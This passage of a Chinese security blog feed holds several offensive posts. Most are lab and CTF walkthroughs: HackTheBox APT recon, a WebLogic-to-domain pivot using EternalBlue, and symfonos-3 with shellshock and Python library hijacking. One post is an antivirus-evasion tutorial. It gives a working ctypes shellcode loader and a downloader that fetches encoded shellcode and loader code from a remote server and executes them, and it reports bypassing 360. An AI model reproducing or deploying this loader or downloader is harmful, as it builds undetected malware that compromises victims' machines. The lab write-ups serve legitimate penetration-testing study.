alt="image-20230608110058331"></p><h2 id="135端口信息收集"><a href="#135端口信息收集" class="headerlink" title="135端口信息收集"></a>135端口信息收集</h2><p>80端口无法利用,把突破口转向135端口</p><p>135端口信息</p><p><a href="https://book.hacktricks.xyz/network-services-pentesting/135-pentesting-msrpc">https://book.hacktricks.xyz/network-services-pentesting/135-pentesting-msrpc</a></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202306081118430.png" alt="image-20230608111838396"></p><p>使用rpcclient尝试连接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpcclient 10.129.96.60 -p 135 <span class="comment">#需要指定端口为135,因为rpc默认端口为139</span></span><br></pre></td></tr></table></figure><p>连接失败</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202306081124189.png" alt="image-20230608112415164"></p><p>使用impacket工具包,先添加环境变量 impacket工具包详解 <a href="https://xz.aliyun.com/t/11877">https://xz.aliyun.com/t/11877</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> PATH=/usr/share/doc/python3-impacket/examples:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure><p>使用impacket工具包中的rpcdump.py</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202306081448815.png" alt="image-20230608144809783"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;p&gt;Hackthebox名为APT靶机的域渗透，即动态目录渗透，Insane级别即疯狂难度级别&lt;/p&gt;
&lt;h1 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h1&gt;&lt;p&gt;连接上vpn后的攻击机ip&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202306071038755.png&quot; alt=&quot;image-20230607103822712&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="hackthebox" scheme="https://syst1m.top/tags/hackthebox/"/>
    
    <category term="域渗透" scheme="https://syst1m.top/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>python bypss 第二弹</title>
    <link href="https://syst1m.top/2023/05/16/python-bypss-%E7%AC%AC%E4%BA%8C%E5%BC%B9/"/>
    <id>https://syst1m.top/2023/05/16/python-bypss-%E7%AC%AC%E4%BA%8C%E5%BC%B9/</id>
    <published>2023-05-16T08:14:00.000Z</published>
    <updated>2023-05-16T08:54:38.524Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>没什么技术含量,响应群友要求水一篇</p><h1 id="shellcode处理"><a href="#shellcode处理" class="headerlink" title="shellcode处理"></a>shellcode处理</h1><p>生成python的payload</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202305161623151.png" alt="image-20230516162321944"></p><p>取出shellcode去掉”\x”就是这个样子</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202305161628772.png" alt="image-20230516162821737"></p><p>base64编码一下,当然还可以继续加密,异或或者aes等等,自写加密也行</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202305161628481.png" alt="image-20230516162841455"></p><p>保存为一个,或者多个txt文件,或者图片隐写,都可以,这里只提供一个简单思路</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202305161630200.png" alt="image-20230516163022164"></p><h1 id="加载器处理"><a href="#加载器处理" class="headerlink" title="加载器处理"></a>加载器处理</h1><p>加载器,就不多说了,shellcode好比子弹,加载器就是手枪,加载器网上到处都是,无非就是申请,读写,执行内存.加载器对于免杀很重要,现在大多数的加载器api都被打上标记了</p><p>提供一个</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64;rwxpage = ctypes.windll.kernel32.VirtualAlloc(<span class="number">0</span>, <span class="built_in">len</span>(shellcode), <span class="number">0x1000</span>, <span class="number">0x40</span>);ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(rwxpage), ctypes.create_string_buffer(shellcode),<span class="built_in">len</span>(shellcode));handle = ctypes.windll.kernel32.CreateThread(<span class="number">0</span>, <span class="number">0</span>, ctypes.c_uint64(rwxpage), <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);ctypes.windll.kernel32.WaitForSingleObject(handle, -<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>加载器同理shellcode,base64编码一下,也可以继续加密,保存为txt放到服务器上</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202305161635708.png" alt="image-20230516163518666"></p><h1 id="下载器"><a href="#下载器" class="headerlink" title="下载器"></a>下载器</h1><p>现在写主程序,也就是下载器,我们用这个程序去远程下载加载器和shellcode,只要你服务器不被标记,谁敢说我这是木马??</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> ctypes, urllib.request</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取shellcode</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_code</span>():</span><br><span class="line">    base64_code = urllib.request.urlopen(<span class="string">&#x27;http://x.x.x.x/shellcode.txt&#x27;</span>).read()</span><br><span class="line">    shellcode = base64.b64decode(base64_code)</span><br><span class="line">    shellcode = <span class="built_in">bytes</span>.fromhex(<span class="built_in">str</span>(shellcode, <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> shellcode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取加载器</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_loader</span>():</span><br><span class="line">    base64_loader = urllib.request.urlopen(<span class="string">&#x27;http://x.x.x.x/loader.txt&#x27;</span>).read()</span><br><span class="line">    <span class="keyword">return</span> base64_loader</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    shellcode = get_code()</span><br><span class="line">    loader = get_loader()</span><br><span class="line">    <span class="built_in">exec</span>(base64.b64decode(loader))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>写个main.py再套个壳,使用import加载调用,再判断下当前路径是否存在这个ok.txt文件,不存在不执行,算是防止被杀软之类的放进沙箱吧,似乎有一点卵用</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> loader</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">if</span> os.path.exists(<span class="string">&#x27;ok.txt&#x27;</span>):</span><br><span class="line">    loader.main()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;The file does not exist and will not be executed&#x27;</span>)</span><br></pre></td></tr></table></figure><h1 id="打包"><a href="#打包" class="headerlink" title="打包"></a>打包</h1><p>pyinstaller打包的时候再加密一下</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202305161654091.png" alt="image-20230516165426043"></p><p>记得放个ok.txt才会正常运行,正常上线</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202305161646454.png" alt="image-20230516164600412"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202305161645041.png" alt="image-20230516164529002"></p><h1 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h1><p>嫌麻烦只测了360</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202305161647480.png" alt="image-20230516164700432"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;没什么技术含量,响应群友要求水一篇&lt;/p&gt;
&lt;h1 id=&quot;shellcode处理&quot;&gt;&lt;a href=&quot;#shellcode处理&quot; class=&quot;headerlink&quot; title=&quot;shellcode处理&quot;&gt;&lt;/a&gt;shellcode处理&lt;/h1&gt;&lt;p&gt;生成python的payload&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202305161623151.png&quot; alt=&quot;image-20230516162321944&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="造轮子" scheme="https://syst1m.top/categories/%E9%80%A0%E8%BD%AE%E5%AD%90/"/>
    
    
    <category term="免杀" scheme="https://syst1m.top/tags/%E5%85%8D%E6%9D%80/"/>
    
    <category term="bypass" scheme="https://syst1m.top/tags/bypass/"/>
    
  </entry>
  
  <entry>
    <title>从外网 Weblogic 打进内网，再到约束委派接管域控</title>
    <link href="https://syst1m.top/2023/03/08/%E4%BB%8E%E5%A4%96%E7%BD%91-Weblogic-%E6%89%93%E8%BF%9B%E5%86%85%E7%BD%91%EF%BC%8C%E5%86%8D%E5%88%B0%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%8E%A5%E7%AE%A1%E5%9F%9F%E6%8E%A7/"/>
    <id>https://syst1m.top/2023/03/08/%E4%BB%8E%E5%A4%96%E7%BD%91-Weblogic-%E6%89%93%E8%BF%9B%E5%86%85%E7%BD%91%EF%BC%8C%E5%86%8D%E5%88%B0%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%8E%A5%E7%AE%A1%E5%9F%9F%E6%8E%A7/</id>
    <published>2023-03-08T06:03:02.000Z</published>
    <updated>2023-03-08T09:55:33.633Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>此靶场来自 渗透攻击红队</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202303081404541.jpeg" alt="img"></p><p>域控桌面下有一个 Flag 文件，需要拿到即可通关</p><h1 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h1><h2 id="外网打点之-Weblogic-CVE-2017-10271"><a href="#外网打点之-Weblogic-CVE-2017-10271" class="headerlink" title="外网打点之 Weblogic-CVE-2017-10271"></a>外网打点之 Weblogic-CVE-2017-10271</h2><p>拿到目标,先扫一下c段,筛选出目标ip为192.168.1.16</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202303081418639.png" alt="image-20230308141844603"></p><p>继续扫端口,直接精准扫描端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -v -Pn -T3 -sV -n -sT --open -p 22,1222,2222,22345,23,21,445,135,139,5985,2121,3389,13389,6379,4505,1433,3306,5000,5236,5900,5432,1521,1099,53,995,8140,993,465,878,7001,389,902,1194,1080,88 192.168.1.16</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202303081429120.png" alt="image-20230308142938095"></p><p>开放7001,无疑是weblogic了</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202303081432282.png" alt="image-20230308143256257"></p><p>直接拿exp打,通过exp工具执行cs powershell上线cs<img src="https://raw.githubusercontent.com/chencicici/images/main/202303081538576.png" alt="image-20230308153805133"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202303081540937.png" alt="image-20230308154023911"></p><h1 id="内网打点"><a href="#内网打点" class="headerlink" title="内网打点"></a>内网打点</h1><h2 id="永恒之蓝拿下内网权限"><a href="#永恒之蓝拿下内网权限" class="headerlink" title="永恒之蓝拿下内网权限"></a>永恒之蓝拿下内网权限</h2><p>信息收集,发现有两张网卡</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202303081550282.png" alt="image-20230308155002259"></p><p>发现内网10.10.20网段还有一台存活主机</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202303081552051.png" alt="image-20230308155234029"></p><p>丢个fscan上去扫一下,存在永恒之蓝</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202303081554474.png" alt="image-20230308155424450"></p><p>把我们的入口机上线到msf,搭个到10.10.20网段的跳板,然后打17010</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202303081558512.png" alt="image-20230308155827480"></p><p>把生成的payload拿去16那台入口机执行,让他上线msf,等一会,等他上线</p><p>拿到会话查看路由</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202303081614550.png" alt="image-20230308161426504"></p><p>添加路由,现在msf已经可以打到10网段了</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202303081615156.png" alt="image-20230308161509127"></p><p>其实也可以直接用cs开启隧道,用msf直接打10网段,但是,无所谓啦~</p><p>注意这里要使用正向payload,因为靶机是连接不到我们的kali的</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202303081620064.png" alt="image-20230308162050033"></p><p>直接就是system权限</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202303081622186.png" alt="image-20230308162210150"></p><p>继续上线到cs,做信息收集,这台win7是不出网的,要上线cs只能用转发上线</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202303081631652.png" alt="image-20230308163125621"></p><p>上线cs</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202303081647850.png" alt="image-20230308164740806"></p><h2 id="域打点"><a href="#域打点" class="headerlink" title="域打点"></a>域打点</h2><p>发现域</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202303081648242.png" alt="image-20230308164858212"></p><p>域内信息,一般dns服务器就是域控了</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202303081651266.png" alt="image-20230308165144231"></p><p>确认域控为10.10.10.8</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202303081655629.png" alt="image-20230308165515590"></p><p>fscan进一步扫描这个网段,其实是有SQLserver的,不过要手动开一下,但是sqlserver过期了,直接寄</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202303081702600.png" alt="image-20230308170205558"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;此靶场来自 渗透攻击红队&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202303081404541.jpeg&quot; alt=&quot;img&quot;&gt;&lt;/p&gt;
&lt;p&gt;域控桌面下有一个 Flag 文件，需要拿到即可通关&lt;/p&gt;
&lt;h1 id=&quot;外网打点&quot;&gt;&lt;a href=&quot;#外网打点&quot; class=&quot;headerlink&quot; title=&quot;外网打点&quot;&gt;&lt;/a&gt;外网打点&lt;/h1&gt;</summary>
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="域渗透" scheme="https://syst1m.top/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
    <category term="红队" scheme="https://syst1m.top/tags/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="多层内网" scheme="https://syst1m.top/tags/%E5%A4%9A%E5%B1%82%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>红队-多层内网环境渗透测试</title>
    <link href="https://syst1m.top/2022/12/24/%E7%BA%A2%E9%98%9F-%E5%A4%9A%E5%B1%82%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    <id>https://syst1m.top/2022/12/24/%E7%BA%A2%E9%98%9F-%E5%A4%9A%E5%B1%82%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</id>
    <published>2022-12-24T05:46:22.000Z</published>
    <updated>2022-12-24T16:01:18.545Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>靶场来自 <a href="https://www.freebuf.com/articles/web/349557.html">https://www.freebuf.com/articles/web/349557.html</a></p><h1 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>先确定靶机ip</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.31.0/24</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212241515767.png"></p><p>对靶机进行扫描,7001,不多说</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212241517275.png"></p><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>掏出利用工具,存在漏洞</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212241527034.png"></p><p>写入一个冰蝎webshell,方便后面操作</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212241528864.png"></p><h1 id="内网横向"><a href="#内网横向" class="headerlink" title="内网横向"></a>内网横向</h1><h2 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h2><p>可以看到有两个网卡</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212241537045.png"></p><p>上线到cs进行内网信息收集</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212241557372.png"></p><p>查看域信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net config workstation</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212241612034.png"></p><p>上传fscan进一步扫描漏洞,扫描出10.10.20.7存在17010</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212241617024.png"></p><h2 id="会话传递"><a href="#会话传递" class="headerlink" title="会话传递"></a>会话传递</h2><p>把cs会话传给msf,打17010,新建一个监听器</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212241620692.png"></p><p>msf启动监听,payload要一致</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212241621312.png"></p><p>新增会话,选择刚刚新建的监听器</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212241624854.png"></p><h2 id="msf隧道"><a href="#msf隧道" class="headerlink" title="msf隧道"></a>msf隧道</h2><p>添加路由</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/multi/manage/autoroute</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212241642712.png"></p><p>此时,msf已经可以访问10.10.20.0网段</p><p>这里要注意,使用正向payload</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212241648214.png"></p><p>成功打下10.10.20.7</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212241656149.png"></p><p>还存在另一个网段</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212241702365.png"></p><h2 id="转发上线cs"><a href="#转发上线cs" class="headerlink" title="转发上线cs"></a>转发上线cs</h2><p>新建一个转发上线的监听器</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212242247250.png"></p><p>生成后门,选择监听器为转发上线监听器</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212242232706.png"></p><p>利用msf上传到windows7上</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212242238972.png"></p><p>后面都差不多,没啥意思就不继续了</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h1&gt;&lt;p&gt;靶场来自 &lt;a href=&quot;https://www.freebuf.com/articles/web/349557.html&quot;&gt;https://www.freebuf.com/articles/web/349557.html&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;外网打点&quot;&gt;&lt;a href=&quot;#外网打点&quot; class=&quot;headerlink&quot; title=&quot;外网打点&quot;&gt;&lt;/a&gt;外网打点&lt;/h1&gt;&lt;h2 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h2&gt;&lt;p&gt;先确定靶机ip&lt;/p&gt;</summary>
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="域渗透" scheme="https://syst1m.top/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
    <category term="红队" scheme="https://syst1m.top/tags/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="多层内网" scheme="https://syst1m.top/tags/%E5%A4%9A%E5%B1%82%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>symfonos系列打靶-3</title>
    <link href="https://syst1m.top/2022/12/07/symfonos%E7%B3%BB%E5%88%97%E6%89%93%E9%9D%B6-3/"/>
    <id>https://syst1m.top/2022/12/07/symfonos%E7%B3%BB%E5%88%97%E6%89%93%E9%9D%B6-3/</id>
    <published>2022-12-07T07:20:41.000Z</published>
    <updated>2022-12-07T10:13:50.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>靶机 <a href="https://www.vulnhub.com/entry/symfonos-3,332/">https://www.vulnhub.com/entry/symfonos-3,332/</a></p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>首先确定目标ip</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.31.0/24</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212071534925.png"></p><p>详细信息收集,这次倒是没有smb服务了</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212071539611.png"></p><p>开启了21,22,80端口,先看看首页吧,除了一张图没什么东西,爆破看看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.31.109/   </span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212071550047.png"></p><p>emmm..没扫出东西来,换个扫描器换个字典</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -r -u http://192.168.31.109/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212071555609.png"></p><p>gobuster速度很快,但是扫描结果看着没dirsearch看着舒服</p><p>扫出一个gate目录,发现还是没东西,继续向下爆破二级目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -r -u http://192.168.31.109/gate -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212071602597.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212071603627.png"></p><p>还是没东西,继续向下爆破三级目录,没东西了</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212071605078.png"></p><p>换个字典,继续爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -r -u http://192.168.31.109/gate/cerberus -w /usr/share/wordlists/rockyou.txt -t 50 --no-error</span><br></pre></td></tr></table></figure><p>似乎有点东西了,继续向下</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212071611305.png"></p><p>又发现几个目录,毫无用处…</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212071618713.png"></p><p>看了wp,真是日了狗了,还得是你啊dirb</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212071620057.png"></p><p>换gobuster继续跑</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -r -u http://192.168.31.109/cgi-bin/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 --no-error</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212071641708.png"></p><p>终于等到你,这是一个uptime命令的回显</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212071643849.png"></p><p>加上路径&#x2F;cgi-bin,应该是shellshock漏洞</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Shellshock的原理是利用了Bash在导入环境变量函数时候的漏洞，启动Bash的时候，它不但会导入这个函数，而且也会把函数定义后面的命令执行。</span><br><span class="line">在有些CGI脚本的设计中，数据是通过环境变量来传递的，这样就给了数据提供者利用Shellshock漏洞的机会。</span><br><span class="line">简单来说就是由于服务器的cgi脚本调用了bash命令，由于bash版本过低，攻击者把有害数据写入环境变量，传到服务器端，触发服务器运行Bash脚本，完成攻击。</span><br><span class="line">————————————————</span><br><span class="line">版权声明：本文为CSDN博主「悬镜安全」的原创文章，遵循CC <span class="number">4.0</span> BY-SA版权协议，转载请附上原文出处链接及本声明。</span><br><span class="line">原文链接：https:<span class="regexp">//</span>blog.csdn.net<span class="regexp">/Anprou/</span>article<span class="regexp">/details/</span><span class="number">72819989</span></span><br></pre></td></tr></table></figure><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>msf找payload来打</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212071659895.png"></p><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>拿到会话,suid有个ping,是有机会提权的,但是要用到gcc,目标没有gcc,上提权脚本<a href="https://github.com/carlospolop/PEASS-ng/releases/tag/20221204">linpeas.sh</a></p><p>本地起一个http服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure><p>靶机去下载</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">wget http://192.168.31.54/linpeas.sh</span><br><span class="line"><span class="built_in">chmod</span> +x ./linpeas.sh</span><br><span class="line">./linpeas.sh</span><br></pre></td></tr></table></figure><p>没看到可用点,传个pspy上去看看进程,还是一样的传法</p><p>uid&#x3D;0就是root,这个python脚本没有权限查看</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212071745448.png"></p><p>但是我们可以抓包看看,他在做什么</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">tcpdump -D</span><br><span class="line">tcpdump -w ftp.pcap -i lo <span class="comment">#127走回环口</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212071750717.png"></p><p>然后把数据包传回来分析,还是一样的用py起一个http服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer <span class="comment"># py2</span></span><br></pre></td></tr></table></figure><p>锁定21端口找啊找,翻到一个密码 hades  PTpZTfU4vxgzvRBE</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212071754578.png"></p><p>直接ssh方便一点</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh hades@192.168.31.109  </span><br></pre></td></tr></table></figure><p>常规提权操作无果,直奔ftpclient.py</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212071759772.png"></p><p>可以看到引入了一个库 ftplib,尝试修改这个库,达到提权的效果,因为这个脚本是以root权限运行的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name ftplib.* 2&gt;/dev/null <span class="comment">#把错误信息抛出</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212071803671.png"></p><p>继续跟进,可以看到root和gods组是可以修改的</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212071805111.png"></p><p>写入反弹shell的命令</p><figure 